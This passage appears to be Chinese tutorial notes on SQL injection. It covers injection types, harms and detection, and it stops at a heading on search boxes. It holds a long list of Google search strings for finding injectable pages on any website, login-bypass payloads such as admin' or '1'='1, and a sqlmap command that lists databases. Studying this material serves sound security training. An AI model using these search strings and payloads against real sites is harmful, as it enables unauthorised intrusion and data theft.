# 原理
​ web应用程序对用户输入的参数没有进行严格过滤（如过滤单双引号 尖括号等），就被带到数据库执行，造成了SQL注入。
# 分类
## 根据参数
### 数值型注入
1、前台页面输入的参数是`数字`，比如下面这个根据ID查询用户的功能
2、后台对应的SQL如下，字段类型是数值型，这种就是数值型注入
    select * from user where id = 2;
### 字符型注入
1、前台页面输入的参数是`字符串`，比如下面这个登录功能，输入的用户名和密码是字符串
2、后台对应的SQL如下，字段类型是字符型，这种就是字符型注入
    select * from user 
    where username = 'zhangsan' and password = '123abc';
3、字符可以使用单引号包裹，也可以使用双引号包裹，根据包裹字符串的`引号`不同，字符型注入可以分为：`单引号字符型注入`和`双引号字符型注入`。
## 提交类型
### GET注入
1、使用get请求提交数据，比如 xxx.php?id=1。
### POST注入
1、使用post请求提交数据，比如表单。
### Cookie注入
1、使用Cookie的某个字段提交数据，比如在Cookie中保存用户信息。
### HTTP Header注入
1、使用请求头提交数据，比如检测HTTP中的源地址、主机IP等。
## 是否回显
### 显注
1、前端页面可以回显用户信息，比如 联合注入、报错注入。
### 盲注
1、前端页面不能回显用户信息，比如 布尔盲注、时间盲注。
# 危害
1、数据库信息泄露。
2、网页篡改：登陆后台后发布恶意内容。
3、网站挂马 : 当拿到webshell时或者获取到服务器的权限以后，可将一些网页木马挂在服务器上，去攻击别人。
4、私自添加系统账号。
5、读写文件获取webshell。
# 如何挖掘
## 常见位置
    1、登录框
    2、搜索框
    3、url中：xxx?id= OR xxx?num=
## 信息收集
**Google hack语法**
    inurl:/search_results.php search=
    inurl:’Product.asp?BigClassName
    inurl:Article_Print.asp?
    inurl:NewsInfo.asp?id=
    inurl:EnCompHonorBig.asp?id=
    inurl:NewsInfo.asp?id=
    inurl:ManageLogin.asp
    inurl:Offer.php?idf=
    inurl:Opinions.php?id=
    inurl:Page.php?id=
    inurl:Pop.php?id=
    inurl:Post.php?id=
    inurl:Prod_info.php?id=
    inurl:Product-item.php?id=
    inurl:Product.php?id=
    inurl:Product_ranges_view.php?ID=
    inurl:Productdetail.php?id=
    inurl:Productinfo.php?id=
    inurl:Produit.php?id=
    inurl:Profile_view.php?id=
    inurl:Publications.php?id=
    inurl:Stray-Questions-View.php?num=
    inurl:aboutbook.php?id=
    inurl:ages.php?id=
    inurl:announce.php?id=
    inurl:art.php?idm=
    inurl:article.php?ID=
    inurl:asp?id=
    inurl:avd_start.php?avd=
    inurl:band_info.php?id=
    inurl:buy.php?category=
    inurl:category.php?id=
    inurl:channel_id=
    inurl:chappies.php?id=
    inurl:clanek.php4?id=
    inurl:clubpage.php?id=
    inurl:collectionitem.php?id=
    inurl:communique_detail.php?id=
    inurl:curriculum.php?id=
    inurl:declaration_more.php?decl_id=
    inurl:detail.php?ID=
    inurl:download.php?id=
    inurl:downloads_info.php?id=
    inurl:event.php?id=
    inurl:faq2.php?id=
    inurl:fellows.php?id=
    inurl:fiche_spectacle.php?id=
    inurl:forum_bds.php?num=
    inurl:galeri_info.php?l=
    inurl:gallery.php?id=
    inurl:game.php?id=
    inurl:games.php?id=
    inurl:historialeer.php?num=
    inurl:hosting_info.php?id=
    inurl:humor.php?id=
## 如何判断
### 登录框
**手工**
1、测试步骤
    1）、加单引号：select * from table where name='admin''；由于加单引号后变成三个单引号，则无法执行，程序会报错。
    2）、加 ' and 1=1 此时sql 语句为：select * from table where name='admin' and 1=1' ，也无法进行注入，还需要通过注释符号将其绕过；因此，构造语句为：select * from table where name ='admin' and 1=1--' 可成功执行返回结果正确。
    3）、加and 1=2-- 此时sql语句为：select * from table where name='admin' and 1=2–-'则会报错。
    4）、满足以上3个条件则存在字符型注入
2、测试方式
    #平常测试方式
    账号：zhangsan'
    密码：123456'
    #对比两次结果是否异常
    账号：zhangsan' and 1=1#  （zhangsan' and 1=1--  zhangsan' and 1=1--+）
    密码：zhangsan' and 1=1#  （zhangsan' and 1=1--  zhangsan' and 1=1--+）
    账号：zhangsan' and 1=2#  （zhangsan' and 1=2--  zhangsan' and 1=2--+）
    密码：zhangsan' and 1=2#  （zhangsan' and 1=2--  zhangsan' and 1=2--+）
    #万能密码测试
    账号：admin' or '1'='1
    密码：admin' or '1'='1
    账号：admin' and 1=1
    密码：admin' and 1=1
    账号：admin' or 1=1 or ''='
    密码：admin' or 1=1 or ''='
**工具**
    #-p参数指定的是需要测试的字段
    python sqlmap.py -r data.txt -p user --level 3 --dbs --batch
### 搜索框
**手工**